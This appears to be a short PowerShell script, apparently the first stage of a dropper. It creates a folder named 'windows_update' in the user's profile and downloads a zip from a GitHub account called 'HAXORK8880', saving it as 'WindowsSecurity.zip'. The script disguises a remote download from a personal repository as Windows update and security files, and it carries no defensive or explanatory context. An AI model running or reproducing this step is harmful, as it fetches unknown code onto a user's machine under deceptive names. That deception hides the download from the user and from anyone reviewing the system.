cd $ENV:UserProfile
mkdir windows_update
cd windows_update
Invoke-WebRequest -Uri 'https://github.com/HAXORK8880/commands/blob/main/python.zip?raw=true' -OutFile $ENV:UserProfile'\windows_update\WindowsSecurity.zip'
